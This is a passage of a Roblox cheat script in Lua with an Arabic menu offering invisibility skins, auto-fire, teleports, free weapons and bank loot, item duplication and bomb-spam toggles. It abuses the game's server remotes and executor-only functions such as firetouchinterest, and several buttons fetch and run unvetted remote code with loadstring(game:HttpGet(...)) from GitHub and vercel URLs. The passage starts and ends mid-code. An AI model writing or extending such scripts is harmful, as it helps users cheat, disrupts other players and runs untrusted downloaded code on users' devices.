    Callback = function(value)
        toggleRGBCharacter(value)
    end
})

TabSk:AddButton({
    Name = "👻اختفاء",
    Description = "سكن مخفي حقيقي",
Callback = function()
        
        local args = {
    [1] = {
        [1] = 102344834840946,
        [2] = 70400527171038,
        [3] = 0,
        [4] = 0,
        [5] = 0,
        [6] = 0
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer(unpack(args))
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(111858803548721)
local allaccessories = {}

for zxcwefwfecas, xcaefwefas in ipairs({
    game.Players.LocalPlayer.Character.Humanoid.HumanoidDescription.BackAccessory,
    game.Players.LocalPlayer.Character.Humanoid.HumanoidDescription.FaceAccessory,
    game.Players.LocalPlayer.Character.Humanoid.HumanoidDescription.FrontAccessory,
    game.Players.LocalPlayer.Character.Humanoid.HumanoidDescription.NeckAccessory,
    game.Players.LocalPlayer.Character.Humanoid.HumanoidDescription.HatAccessory,
    game.Players.LocalPlayer.Character.Humanoid.HumanoidDescription.HairAccessory,
    game.Players.LocalPlayer.Character.Humanoid.HumanoidDescription.ShouldersAccessory,
    game.Players.LocalPlayer.Character.Humanoid.HumanoidDescription.WaistAccessory,
    game.Players.LocalPlayer.Character.Humanoid.HumanoidDescription.GraphicTShirt
}) do
    for scacvdfbdb in string.gmatch(xcaefwefas, "%d+") do
        table.insert(allaccessories, tonumber(scacvdfbdb))
    end
end

wait()

for asdwr,asderg in ipairs(allaccessories) do
    task.spawn(function()
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(asderg)
        print(asderg)
    end)
end
    end
})

TabSk:AddToggle({
    Name = "🌫️دخان تلقائي",
    Description = "الوحيد بالعالم",
    Default = false,
    Callback = function(Value)
        isActive = Value

        while isActive do
            local player = game.Players.LocalPlayer
            local character = player.Character
            local root = character and character:FindFirstChild("HumanoidRootPart")

            if root then
                local oven =
                    workspace:FindFirstChild("Mall")
                    and workspace.Mall:FindFirstChild("Pizza")
                    and workspace.Mall.Pizza:FindFirstChild("PizzaOven")
                    and workspace.Mall.Pizza.PizzaOven:FindFirstChild("CatchFire")

                if oven and oven:FindFirstChild("TouchInterest") then
                    firetouchinterest(root, oven, 0)
                    task.wait()
                    firetouchinterest(root, oven, 1)
                end
            end

            task.wait(1)
        end
    end
})
TabSk:AddToggle({
Name = "☢️نار النووي تلقائي",
Default = false,
Callback = function(Value)

isActive = Value
Workspace = game:GetService("Workspace")
Lots = Workspace:WaitForChild("001_Lots")
targetPosition = Vector3.new(788.489868, -11.7437878, 473.890076)
tolerance = 1
isTouching = false

while isActive do

for _, lot in pairs(Lots:GetChildren()) do
    success, house = pcall(function()
        return lot.HousePickedByPlayer.HouseModel.Components.Water
    end)

    if success and house and house:IsA("BasePart") then
        if (house.Position - targetPosition).Magnitude <= tolerance then

            if not isTouching then
                isTouching = true

                character = game.Players.LocalPlayer.Character
                if character then
                    root = character:FindFirstChild("HumanoidRootPart")

                    if root and firetouchinterest then
                        firetouchinterest(root, house, 0)
                        wait()
                        firetouchinterest(root, house, 1)
                    end
                end

                isTouching = false
            end

        end
    end
end

wait(1)

end

end
})
TabSk:AddToggle({
Name = "🔥نار تلقائية في السكن",
Description = "من اقتراح:Ahmed_Nokia",
Default = false,
Callback = function(Value)

isActive = Value

while isActive do

found = false

for _, lot in pairs(workspace:WaitForChild("001_Lots"):GetChildren()) do
    housePicked = lot:FindFirstChild("HousePickedByPlayer")
    if housePicked then
        model = housePicked:FindFirstChild("HouseModel")
        if model then
            bbq = model:FindFirstChild("001_BBQ")
            if bbq then
                catchFire = bbq:FindFirstChild("CatchFire")
                if catchFire then
                    found = true

                    character = game.Players.LocalPlayer.Character
                    if character then
                        root = character:FindFirstChild("HumanoidRootPart")
                        if root then
                            if firetouchinterest then
                                firetouchinterest(root, catchFire, 0)
                                wait()
                                firetouchinterest(root, catchFire, 1)
                            else
                                root.CFrame = catchFire.CFrame
                            end
                        end
                    end

                end
            end
        end
    end
end

if not found then
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "لايوجد شواية نار",
            Text = "يرجى شراء بيت فيه شواية لتشغيل النار",
            Duration = 5
        })
    end)
end

wait(1)

end

end
})

TabSk:AddButton({
    Name = "تفعيل نار في اليد",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local OldPos = RootPart.CFrame
        
        local function freezeHumanoid(humanoid)
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
        end
        
        local function restoreHumanoid(humanoid)
            humanoid.WalkSpeed = 16
            humanoid.JumpPower = 50
        end
        
        local firstPosition = CFrame.new(-349, 5, 98)
        
        local PoolClick = workspace.WorkspaceCom["001_Hospital"]:FindFirstChild("PoolClick")
        
        if PoolClick and PoolClick:FindFirstChild("ClickDetector") then
            freezeHumanoid(Humanoid)
            RootPart.CFrame = firstPosition
            task.wait(1)
            RootPart.CFrame = PoolClick.CFrame
            fireclickdetector(PoolClick.ClickDetector)
            task.wait(2)
            RootPart.CFrame = OldPos
            restoreHumanoid(Humanoid)
        else
            warn("PoolClick ou ClickDetector não encontrado!")
        end
    end
})

local ParticalTab = Window:MakeTab({ 
Title = "المؤثرات", 
Icon = "rbxassetid://10723415903" })

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ApplyEmmiter = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("ApplyEmmiter")

local particleData = {
    {display="أبيض مجاني",server="0002FreeWhite",asset="rbxassetid://18635845425"},
    {display="أصفر مجاني",server="0003FreeYellow",asset="rbxassetid://18635841291"},
    {display="برتقالي مجاني",server="0004FreeOrange",asset="rbxassetid://18635859639"},
    {display="أخضر مجاني",server="0005FreeGreen",asset="rbxassetid://18635848788"},
    {display="أزرق مجاني",server="0006FreeBlue",asset="rbxassetid://18635847163"},
    {display="بنفسجي مجاني",server="0007FreePurple",asset="rbxassetid://18635843697"},
    {display="وردي مجاني",server="0008FreePink",asset="rbxassetid://18635852477"},
    {display="أحمر مجاني",server="0009FreeRed",asset="rbxassetid://18635837646"},

    {display="قلوب صفراء",server="001HeartsYellow",asset="rbxassetid://18635672195"},
    {display="قلوب خضراء",server="002HeartsGreen",asset="rbxassetid://18635727693"},
    {display="قلوب زرقاء",server="003HeartsBlue",asset="rbxassetid://18635732186"},
    {display="قلوب بنفسجية",server="004HeartsPurple",asset="rbxassetid://18635723426"},
    {display="قلوب وردية",server="005HeartsPink",asset="rbxassetid://18635726250"},
    {display="قلوب حمراء",server="006HeartsRed",asset="rbxassetid://18635729673"},

    {display="نقاط برتقالية",server="010DotsOrange",asset="rbxassetid://18637252424"},
    {display="نقاط صفراء",server="011DotsYellow",asset="rbxassetid://18637263004"},
    {display="نقاط بيضاء",server="012DotsWhite",asset="rbxassetid://18637254199"},
    {display="نقاط خضراء",server="013DotsGreen",asset="rbxassetid://18637265264"},
    {display="نقاط زرقاء",server="014DotsBlue",asset="rbxassetid://18637256859"},
    {display="نقاط بنفسجية",server="015DotsPurple",asset="rbxassetid://18637261058"},
    {display="نقاط وردية",server="016DotsPink",asset="rbxassetid://18637259328"},
    {display="نقاط حمراء",server="017DotsRed",asset="rbxassetid://18637267290"},

    {display="وميض أبيض",server="020TwinkleWhite",asset="rbxassetid://18637115654"},
    {display="وميض أصفر",server="021TwinkleYellow",asset="rbxassetid://18637118923"},
    {display="وميض أخضر",server="022TwinkleGreen",asset="rbxassetid://18637151114"},
    {display="وميض بنفسجي",server="023TwinklePurple",asset="rbxassetid://18637153880"},
    {display="وميض وردي",server="024TwinklePink",asset="rbxassetid://18637157071"},
    {display="وميض أحمر",server="025TwinkleRed",asset="rbxassetid://18637155247"},

    {display="نار بيضاء",server="030FireWhite",asset="rbxassetid://18637074370"},
    {display="نار برتقالية",server="031FireOrange",asset="rbxassetid://18637025451"},
    {display="نار خضراء",server="032FireGreen",asset="rbxassetid://18637078598"},
    {display="نار زرقاء",server="033FireBlue",asset="rbxassetid://18637076370"},
    {display="نار بنفسجية",server="034FirePurple",asset="rbxassetid://18637070174"},
    {display="نار سوداء",server="035FireBlack",asset="rbxassetid://18637072603"},

    {display="قلوب صغيرة صفراء",server="040SmallHeartsYellow",asset="rbxassetid://18637339451"},
    {display="قلوب صغيرة خضراء",server="041SmallHeartsGreen",asset="rbxassetid://18637337576"},
    {display="قلوب صغيرة زرقاء",server="042SmallHeartsBlue",asset="rbxassetid://18637345162"},
    {display="قلوب صغيرة بنفسجية",server="043SmallHeartsPurple",asset="rbxassetid://18637335865"},
    {display="قلوب صغيرة وردية",server="044SmallHeartsPink",asset="rbxassetid://18637343416"},
    {display="قلوب صغيرة حمراء",server="045SmallHeartsRed",asset="rbxassetid://18637341847"},

    {display="شرارات بيضاء",server="050SparksWhite",asset="rbxassetid://18637383085"},
    {display="شرارات خضراء",server="051SparksGreen",asset="rbxassetid://18637385236"},
    {display="شرارات زرقاء",server="052SparksBlue",asset="rbxassetid://18637386856"},
    {display="شرارات بنفسجية",server="053SparksPurple",asset="rbxassetid://18637442447"},
    {display="شرارات وردية",server="054SparksPink",asset="rbxassetid://18637445897"},
    {display="شرارات حمراء",server="055SparksRed",asset="rbxassetid://18637447550"},

    {display="فقاعات بيضاء",server="060BubbleWhite",asset="rbxassetid://18637495023"},
    {display="فقاعات خضراء",server="061BubbleGreen",asset="rbxassetid://18637493072"},
    {display="فقاعات زرقاء",server="062BubbleBlue",asset="rbxassetid://18637499282"},
    {display="فقاعات بنفسجية",server="063BubblePurple",asset="rbxassetid://18637497343"},
    {display="فقاعات حمراء",server="064BubbleRed",asset="rbxassetid://18637500927"},

    {display="موسيقى بيضاء",server="070MusicWhite",asset="rbxassetid://18637675173"},
    {display="موسيقى خضراء",server="071MusicGreen",asset="rbxassetid://18637677789"},
    {display="موسيقى زرقاء",server="072MusicBlue",asset="rbxassetid://18637680960"},
    {display="موسيقى بنفسجية",server="073MusicPurple",asset="rbxassetid://18637679384"},
    {display="موسيقى حمراء",server="074MusicRed",asset="rbxassetid://18637672698"},

    {display="دخان أبيض",server="080SmokeWhite",asset="rbxassetid://18637791748"},
    {display="دخان أصفر",server="081SmokeYellow",asset="rbxassetid://18637800482"},
    {display="دخان برتقالي",server="082SmokeOrange",asset="rbxassetid://18637793920"},
    {display="دخان أخضر",server="083SmokeGreen",asset="rbxassetid://18637789299"},
    {display="دخان أزرق",server="084SmokeBlue",asset="rbxassetid://18637803021"},
    {display="دخان بنفسجي",server="085SmokePurple",asset="rbxassetid://18637813360"},
    {display="دخان أحمر",server="086SmokeRed",asset="rbxassetid://18637796598"},
    {display="دخان أسود",server="087SmokeBlack",asset="rbxassetid://18637798529"},

    {display="نجوم بيضاء",server="090StarWhite",asset="rbxassetid://18637942956"},
    {display="نجوم برتقالية",server="091StarOrange",asset="rbxassetid://18637946172"},
    {display="نجوم خضراء",server="092StarGreen",asset="rbxassetid://18637934500"},
    {display="نجوم زرقاء",server="093StarBlue",asset="rbxassetid://18637940338"},
    {display="نجوم بنفسجية",server="094StarPurple",asset="rbxassetid://18637944796"},
    {display="نجوم وردية",server="095StarPink",asset="rbxassetid://18637947820"},
    {display="نجوم حمراء",server="096StarRed",asset="rbxassetid://18637949457"},
}

-- === تقسيم مخصص ===
local Categories = {
    ["مجاني"] = {}
}

for _, v in ipairs(particleData) do
    if v.display:find("مجاني") then
        table.insert(Categories["مجاني"], v)
    else
        local cat = v.display:match("^(%S+)")
        Categories[cat] = Categories[cat] or {}
        table.insert(Categories[cat], v)
    end
end

local Selected = {}

-- === إنشاء Dropdowns ===
for cat, items in pairs(Categories) do
    local options = {}
    for _, v in ipairs(items) do
        table.insert(options, v.display)
    end

    ParticalTab:AddDropdown({
        Name = cat .. " | المؤثرات",
        Options = options,
        Default = options[1],
        Callback = function(val)
            for _, v in ipairs(items) do
                if v.display == val then
                    Selected[cat] = v
                    break
                end
            end
        end
    })

    ParticalTab:AddButton({
        Name = "تفعيل " .. cat,
        Callback = function()
            local v = Selected[cat]
            if v then
                ApplyEmmiter:InvokeServer(
                    v.asset:gsub("rbxassetid://", ""),
                    v.server
                )
            end
        end
    })
end

local AccessoriesTab = Window:MakeTab({
    Title = "الاكسسوارات",
    Icon = "rbxassetid://10723415903"
})

local function Wear(ItemId)
    local args = { [1] = ItemId }
    game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("Wear", 9e9):InvokeServer(unpack(args))
end

AccessoriesTab:AddSection({ Name = "ملابس" })

local clothesOptions = {
    "سترة اسود",
    "سترة زهري كيوت",
    "لبس كيوت 1",
    "لبس كيوت 2",
    "لبس كيوت 3",
    "لبس كيوت 4",
    "لبس كيوت 5"
}

local clothesIds = {
    89892588488089,
    99429391843259,
    84110484978046,
    75698084918608,
    79220663432789,
    78061398976556,
    93303265717630
}

local selectedClothes = clothesOptions[1]

AccessoriesTab:AddDropdown({
    Name = "اختر ملابس",
    Options = clothesOptions,
    Default = selectedClothes,
    Callback = function(value)
        selectedClothes = value
    end
})

AccessoriesTab:AddButton({
    Name = "تفعيل الملابس",
    Callback = function()
        for i, name in ipairs(clothesOptions) do
            if name == selectedClothes then
                Wear(clothesIds[i])
                break
            end
        end
    end
})



-- ==================== 2. قسم: القفازات ====================
AccessoriesTab:AddSection({ Name = "قفازات" })

local glovesOptions = {
    "قفازات يد اسود مخطط",
    "قفازات يد اسود عادي 1",
    "قفازات يد اسود عادي 2",
    "قفازات يد اسود عادي 3",
    "قفازات يد ابيض مزخرف",
    "قفازات يد زهري",
    "قفازات يد احمر",
    "اضافر اسود",
    "قفازات يد قصير 1",
    "قفازات يد قصير 2",
    "قفازات يد قصير 3",
    "قفازات يد قصير 4",
    "قفازات يد قصير 5",
    "قفازات يد قصير 6"
}

local glovesIds = {
    9239689111,
    10789914680,
    11363898043,
    10791180072,
    10871965173,
    10789939838,
    12379676852,
    12825022709,
    12483105503,
    12483109504,
    11613796964,
    10954568687,
    11679250718,
    11182924874
}

local selectedGloves = glovesOptions[1]

AccessoriesTab:AddDropdown({
    Name = "اختر قفازات",
    Options = glovesOptions,
    Default = selectedGloves,
    Callback = function(value)
        selectedGloves = value
    end
})

AccessoriesTab:AddButton({
    Name = "تفعيل القفازات",
    Callback = function()
        for i, name in ipairs(glovesOptions) do
            if name == selectedGloves then
                Wear(glovesIds[i])
                break
            end
        end
    end
})


AccessoriesTab:AddSection({ Name = "الورد" })

local flowersOptions = {
    "ورد احمر وابيض",
    "ورد زهري",
    "ورد سماوي",
    "ورد اسود",
    "ورد ابيض",
    "ورد احمر",
    "مسدس ماء لعبة"
}

local flowersIds = {
    1246535644,
    1246547853,
    12465483807,
    12465465333,
    12465472210,
    12465376206,
    13135818072
}

local selectedFlowers = flowersOptions[1]

AccessoriesTab:AddDropdown({
    Name = "اختر ورد",
    Options = flowersOptions,
    Default = selectedFlowers,
    Callback = function(value)
        selectedFlowers = value
    end
})

AccessoriesTab:AddButton({
    Name = "تفعيل الورد",
    Callback = function()
        for i, name in ipairs(flowersOptions) do
            if name == selectedFlowers then
                Wear(flowersIds[i])
                break
            end
        end
    end
})



-- ==================== 4. قسم: الأحذية ====================
AccessoriesTab:AddSection({ Name = "الأحذية" })

local shoesOptions = {
    "حذاء الشيطان زهري",
    "حذاء الشيطان احمر",
    "حذاء الشيطان ابيض",
    "حذاء الشيطان اسود",
    "حذاء طويل اسود",
    "حذاء طويل ابيض",
    "حذاء طويل ابيض واحمر",
    "حذاء القرش الاسود",
    "حذاء قصير 1",
    "حذاء قصير 2",
    "حذاء قصير 3",
    "حذاء قصير 4",
    "حذاء قصير 5",
    "حذاء قصير 6",
    "حذاء قصير 7",
    "حذاء قصير 8",
    "حذاء قصير 9",
    "حذاء قصير 10"
}

local shoesIds = {
    14388006902,
    14388019333,
    14387999337,
    14388004031,
    11433864064,
    11111279400,
    11708887517,
    13463375063,
    11856087406,
    14388001192,
    12453321203,
    14338742287,
    14338742287,
    12296189693,
    14338732820,
    14338735628,
    14338738380,
    14338744418
}

local selectedShoes = shoesOptions[1]

AccessoriesTab:AddDropdown({
    Name = "اختر حذاء",
    Options = shoesOptions,
    Default = selectedShoes,
    Callback = function(value)
        selectedShoes = value
    end
})

AccessoriesTab:AddButton({
    Name = "تفعيل الحذاء",
    Callback = function()
        for i, name in ipairs(shoesOptions) do
            if name == selectedShoes then
                Wear(shoesIds[i])
                break
            end
        end
    end
})


task.wait(0.1)


local HeadBodyTab = Window:MakeTab({ 
Title = "الرؤوس والاجسام", 
Icon = "shirt" })


local function SafeInvoke(remotePath, args)
    pcall(function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Remote = ReplicatedStorage:WaitForChild(remotePath[1], 10):WaitForChild(remotePath[2], 10)
        Remote:InvokeServer(unpack(args))
    end)
end

HeadBodyTab:AddSection({
    Name = "الرؤوس"
})

local HeadList = {
    "رأس روبـوت",
    "رأس بـنـت كـيـوت",
    "رأس مـخـفـي",
    "رأس كـوبـي| رول",
    "رأس عـيـون زرقـاء"
}

local HeadIds = {
    ["رأس روبـوت"] = 3210773801,
    ["رأس بـنـت كـيـوت"] = 140991,
    ["رأس مـخـفـي"] = 134082579,
    ["رأس كـوبـي| رول"] = 746767604,
    ["رأس عـيـون زرقـاء"] = 16580493236
}

local SelectedHead = HeadList[1]

HeadBodyTab:AddDropdown({
    Name = "اختر رأسًا",
    Options = HeadList,
    Default = SelectedHead,
    Callback = function(value)
        SelectedHead = value
    end
})

HeadBodyTab:AddButton({
    Name = "تفعيل الرأس",
    Callback = function()
        if not SelectedHead then return end
        SafeInvoke({"Remotes", "Wear"}, { HeadIds[SelectedHead] })
    end
})

HeadBodyTab:AddSection({
    Name = "الأجسام"
})

local BodyList = {
    "رجـل مـقـطـوعـة لـلـبـنـات",
    "جـسـم ولـد كـيـوت",
    "جـسـم ولـد رول",
    "جـسـم ولـد مـعـضـل",
    "جـسـم بـنـت 1",
    "جـسـم بـنـت 2",
    "جـسـم بـنـت 3",
    "جـسـم بـنـت 4",
    "جـسـم بـنـت 5",
    "جـسـم بـنـت 6",
    "جـسـم بـنـت 7",
    "جـسـم بـنـت 8",
    "جـسـم بـنـت 9",
    "جـسـم ولـد 1",
    "جـسـم ولـد 2",
    "جـسـم ولـد 3",
    "جـسـم ولـد 4",
    "جـسـم ولـد 5",
    "جـسـم ولـد 6",
    "جـسـم ولـد 7",
    "جـسـم ولـد 8",
    "جـسـم ولـد 9",
    "جـسـم ولـد 10",
    "جـسـم ولـد 11",
    "جـسـم قـزم الـمـربـع"
}

local BodyData = {
    ["رجـل مـقـطـوعـة لـلـبـنـات"] = {96491916349570, 76683091425509, 75159926897589, 139607718, 1, 1},
    ["جـسـم ولـد كـيـوت"] = {27112025, 27112039, 27112052, 27112068, 27112056, 1},
    ["جـسـم ولـد رول"] = {27112025, 27112039, 27112052, 3230472745, 3230470862, 1},
    ["جـسـم ولـد مـعـضـل"] = {27112025, 27112039, 27112052, 27112068, 27112056, 1},
    ["جـسـم بـنـت 1"] = {96491916349570, 76683091425509, 75159926897589, 1, 1, 1},
    ["جـسـم بـنـت 2"] = {96491916349570, 76683091425509, 75159926897589, 18839824178, 18839824209, 1},
    ["جـسـم بـنـت 3"] = {96491916349570, 76683091425509, 75159926897589, 18839824178, 18839824209, 1},
    ["جـسـم بـنـت 4"] = {96491916349570, 76683091425509, 75159926897589, 18839824178, 18839824209, 1},
    ["جـسـم بـنـت 5"] = {96491916349570, 76683091425509, 75159926897589, 111571034664628, 1, 1},
    ["جـسـم بـنـت 6"] = {96491916349570, 76683091425509, 75159926897589, 1, 1, 1},
    ["جـسـم بـنـت 7"] = {96491916349570, 76683091425509, 75159926897589, 18839824178, 18839824209, 1},
    ["جـسـم بـنـت 8"] = {96491916349570, 76683091425509, 75159926897589, 18839824178, 18839824209, 1},
    ["جـسـم بـنـت 9"] = {14861800638, 14861800626, 14861801452, 14861800627, 14861801454, 1},
    ["جـسـم ولـد 1"] = {17754346388, 1, 1, 1, 1, 1},
    ["جـسـم ولـد 2"] = {17754346388, 1, 1, 1, 1, 1},
    ["جـسـم ولـد 3"] = {17754346388, 1, 1, 1, 1, 1},
    ["جـسـم ولـد 4"] = {17754346388, 1, 1, 1, 1, 1},
    ["جـسـم ولـد 5"] = {27112025, 27112039, 27112052, 27112068, 27112056, 1},
    ["جـسـم ولـد 6"] = {27112025, 27112039, 27112052, 27112068, 27112056, 1},
    ["جـسـم ولـد 7"] = {27112025, 27112039, 27112052, 27112068, 27112056, 1},
    ["جـسـم ولـد 8"] = {27112025, 27112039, 27112052, 27112068, 27112056, 1},
    ["جـسـم ولـد 9"] = {27112025, 27112039, 27112052, 27112068, 27112056, 1},
    ["جـسـم ولـد 10"] = {27112025, 27112039, 27112052, 27112068, 27112056, 1},
    ["جـسـم ولـد 11"] = {120973199097564, 118345433416023, 112849465115864, 78321005147549, 106586789635639, 1},
    ["جـسـم قـزم الـمـربـع"] = {126267841602936, 77530451194918, 123471958406889, 117042768644173, 131948590344338, 1}
}

local SelectedBody = BodyList[1]

HeadBodyTab:AddDropdown({
    Name = "اختر جسمًا",
    Options = BodyList,
    Default = SelectedBody,
    Callback = function(value)
        SelectedBody = value
    end
})

HeadBodyTab:AddButton({
    Name = "تفعيل الجسم",
    Callback = function()
        if not SelectedBody then return end
        SafeInvoke({"Remotes", "ChangeCharacterBody"}, { BodyData[SelectedBody] })
    end
})

local MusicTab = Window:MakeTab({ 
Title = "الاغاني", 
Icon = "rbxassetid://10723415903" })

MusicTab:AddButton({
    Name = "سكربت الاغاني",
    Callback = function()
loadstring(game:HttpGet("https://scriptsneonauth.vercel.app/api/scripts/2a199277-9790-4eff-82dd-5e6f950ad007/raw"))()
    end
})

Tab = Window:MakeTab({"الانتقالات والسيرفر", "rbxassetid://10723415903"})
 TeleportService = game:GetService("TeleportService")
 Players = game:GetService("Players")
 LocalPlayer = Players.LocalPlayer

 selectedJobId = nil
 isTeleporting = false

Tab:AddTextBox({
    Name = "الدخول إلى سيرفر",
    Description = "اكتب JobId الخاص بالسيرفر",
    PlaceholderText = "ادخل معرف السيرفر",
    Callback = function(value)
        selectedJobId = tostring(value)
    end
})

Tab:AddButton({
    Name = "دخول السيرفر",
    Callback = function()
        if isTeleporting then return end

        if not selectedJobId or selectedJobId == "" then
            game.StarterGui:SetCore("SendNotification", {
                Title = "خطأ",
                Text = "لم يتم إدخال معرف",
                Duration = 4
            })
            return
        end

        isTeleporting = true

        success, err = pcall(function()
            TeleportService:TeleportToPlaceInstance(
                game.PlaceId,
                selectedJobId,
                LocalPlayer
            )
        end)

        if not success then
            isTeleporting = false

            msg = tostring(err)

            reason = "فشل الدخول إلى السيرفر"

            if msg:lower():find("private") then
                reason = "عذراً، هذا السيرفر خاص 🔒"
            elseif msg:lower():find("full") then
                reason = "عذراً، هذا السيرفر ممتلئ 🚫"
            elseif msg:lower():find("job") or msg:lower():find("instance") then
                reason = "JobId غير صالح ❌"
            end

            game.StarterGui:SetCore("SendNotification", {
                Title = "تعذر الدخول",
                Text = reason,
                Duration = 5
            })
        end
    end
})

TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
    if player ~= LocalPlayer then return end

    isTeleporting = false

    reason = "فشل الانتقال"

    if teleportResult == Enum.TeleportResult.GameFull then
        reason = "عذراً، هذا السيرفر ممتلئ 🚫"
    elseif teleportResult == Enum.TeleportResult.GamePrivate then
        reason = "عذراً، هذا السيرفر خاص 🔒"
    elseif teleportResult == Enum.TeleportResult.InvalidTeleportDestination then
        reason = "معرف غير صالح❌"
    end

    game.StarterGui:SetCore("SendNotification", {
        Title = "تعذر الدخول",
        Text = reason,
        Duration = 5
    })
end)

Tab:AddSection({"الاماكن"})
teleportButtons = {
    {"فندق", CFrame.new(192, 4, 272)},
    {"ساحة المطعم", CFrame.new(136, 4, 117)},
    {"مقر سري تحت الارض", CFrame.new(-119, -28, 235)},
    {"بيت مهجور", CFrame.new(986, 4, 63)},
    {"كهف", CFrame.new(672, 4, -296)},
    {"تحت الماب", CFrame.new(505, -75, 143)},
    {"المدرسة", CFrame.new(-312, 4, 211)},
    {"المطعم", CFrame.new(161, 8, 52)},
    {"البداية", CFrame.new(-26, 4, -23)},
    {"فوق الجسر", CFrame.new(-589, 141, -59)},
    {"مستشفى", CFrame.new(-309, 4, 71)},
    {"مختبر سري", CFrame.new(179, 4, -464)},
    {"تحت الماب1", CFrame.new(0, 4, -495)},
    {"تحت الماب2", CFrame.new(-343, 4, -613)},
    {"الجزيرة", CFrame.new(-1925, 23, 127)},
    {"ساحة الفنادق", CFrame.new(182, 4, 150)},
    {"الجبل الثلجي", CFrame.new(-670, 251, 765)},
    {"البنك", CFrame.new(2.28, 4.65, 254.58)},
    {"محل الملابس", CFrame.new(-46.15, 4.65, 253.20)},
    {"متجر الحيوانات", CFrame.new(-88.48, 22.05, 262.34)},
    {"العيادة", CFrame.new(-53.58, 22.15, 265.61)},
    {"الكافتيريا", CFrame.new(-97.12, 4.65, 254.99)}
}

for _, btn in ipairs(teleportButtons) do
    Tab:AddButton({
        btn[1],
        function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = btn[2]
        end
    })
end

Section1 = Window:MakeTab({
    Title = "الأغراض",
    Icon = "rbxassetid://10723415903"
})

Section1:AddSection("الأغراض")

function PickTool(n)
    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", n)
end

function ClearAllProps()
    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer("ClearAllProps")
end

function ClearAllTools()
    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer("ClearAllTools")
end

for _,v in pairs({
    {"اخذ كنبة","Couch"},
    {"اخذ كيس ناري","PaperbagFire"},
    {"اخذ ايباد","Ipad"},
    {"سنايبر","Sniper"},
    {"سيف","SwordWood"},
    {"قوس","Bow"},
    {"Glouk مسدس","Glock"},
    {"اخذ قنبلة","Bomb"},
    {"سنايبر ريفيل","Assault"}
}) do
    Section1:AddButton({
        Name = v[1],
        Callback = function()
            PickTool(v[2])
        end
    })
end

Section1:AddButton({
    Name = "حذف كل الاغراض",
    Callback = function()
        ClearAllProps()
    end
})

Section1:AddSection("أغراض البنك")

for _,v in pairs({
    {"حقيبة بيتكوين","DuffleBagBitcoin"},
    {"حقيبة الماس","DuffleBagDiamonds"},
    {"حقيبة ذهب","DuffleBagGold"},
    {"بطاقة صفراء","BankGateKey"},
    {"بطاقة بيضاء","KeyCardWhite"}
}) do
    Section1:AddButton({
        Name = v[1],
        Callback = function()
            PickTool(v[2])
        end
    })
end

Section1:AddButton({
    Name = "حذف كل الاغراض",
    Callback = function()
        ClearAllTools()
    end
})
Section1:AddButton({
    Name = "انتقال فوري (يعمل بالنقر)",
    Callback = function()    loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/refs/heads/main/Tahakom84"))()
    end
})

TabSp = Window:MakeTab({
    Title = "[EXTRA]تدبيل+سبام",
    Icon = "rbxassetid://10723415903"
})
TabSp:AddSection({ "تدبيل/سبام" })

TabSp:AddToggle({
	Name = "تدبيل قوارب",
	Default = false,
	Callback = function(enabled)
		if enabled then		loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/refs/heads/main/Tahakom82"))()

		else
			loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/refs/heads/main/Tahakom83"))()
		end

	end
})
 duplicarAtivo = false
 duplicarThread = nil
TabSp:AddToggle({
    Name = "اخذ قنابل",
    Default = false,
    Callback = function(v)
        duplicarAtivo = v
        if duplicarAtivo then
            duplicarThread = task.spawn(function()
                 Player = game.Players.LocalPlayer
                 Character = Player.Character or Player.CharacterAdded:Wait()
                 RootPart = Character:WaitForChild("HumanoidRootPart")
                 OldPos = RootPart.CFrame

                 Bomb = game:GetService("Workspace"):FindFirstChild("WorkspaceCom")
                    and game:GetService("Workspace").WorkspaceCom["001_CriminalWeapons"]:FindFirstChild("GiveTools")
                    and game:GetService("Workspace").WorkspaceCom["001_CriminalWeapons"].GiveTools:FindFirstChild("Bomb")

                if not Bomb or not Bomb:FindFirstChild("ClickDetector") then
                    warn("Erro ao encontrar a Bomb! Tente novamente.")
                    duplicarAtivo = false
                    return
                end

                while duplicarAtivo do
                    for i = 1, 12 do
                        RootPart.CFrame = Bomb.CFrame
                        fireclickdetector(Bomb.ClickDetector)
                        task.wait(0)
                    end
                    task.wait(0.001)
                end

                RootPart.CFrame = OldPos
            end)
        end
    end
})
TabSp:AddToggle({
    Name = "سبام تفجير قنابل",
    Default = false,
    Callback = function(spam)
        if spam then
            task.spawn(function()
                local playerName = game.Players.LocalPlayer.Name
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local VirtualInputManager = game:GetService("VirtualInputManager")

                while spam do
                    pcall(function()
                        local args = {[1] = "Bomb" .. playerName}
                        ReplicatedStorage:WaitForChild("RE")
                            :WaitForChild("1Blo1wBomb1sServe1r")
                            :FireServer(unpack(args))
                    end)

                    pcall(function()
                        VirtualInputManager:SendMouseButtonEvent(500, 500, 0, true, game, 0)
                        task.wait(1.5)
                        VirtualInputManager:SendMouseButtonEvent(500, 500, 0, false, game, 0)
                    end)

                    task.wait(0.1)
                end
            end)
        end
    end
})
TabSp:AddSection({"مسك الاغراض"})
TabSp:AddButton({
  Name = "مسك جميع الاغراض",
  Callback = function()
    local function equiptool()
  for i,v in ipairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
